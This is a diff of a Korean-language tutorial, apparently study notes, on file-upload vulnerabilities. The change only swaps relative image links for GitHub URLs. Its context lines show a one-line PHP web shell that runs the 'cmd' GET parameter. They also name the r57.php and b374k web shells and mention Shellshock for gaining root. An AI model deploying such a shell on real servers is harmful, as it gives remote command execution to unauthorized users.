@@ -64,7 +64,7 @@ print "</pre>";
 
 해당 파일을 업로드한다.
 
-![업로드](./../img/fileupload.jpg)
+![업로드](https://github.com/rinechran/Hws/blob/master/img/fileupload.jpg)
 ```
 <?php
 echo shell_exec($_GET['cmd']);
@@ -72,13 +72,13 @@ echo shell_exec($_GET['cmd']);
 ```
 그리고 간단한 쉘스크립트를 GET프로토콜에 데이터 파라메타인 cmd에 쉘 스크립트를 실행해보자.
 
-![업로드](./../img/exec.jpg)
+![업로드](https://github.com/rinechran/Hws/blob/master/img/exec.jpg)
 
 위의 작업을 좀더 편하게 해주는 php가 대표적으로 r57.php 이 있다.
 
 php를 업로드하여 들어가보자
 
-![업로드](./../img/b374kmini.jpg)
+![업로드](https://github.com/rinechran/Hws/blob/master/img/b374kmini.jpg)
 
 또한 root가아니여도 2014-6271(Shell Shock) 사태처럼 쉘취약점을 이용하여 root를 탈취 가능하다.
 
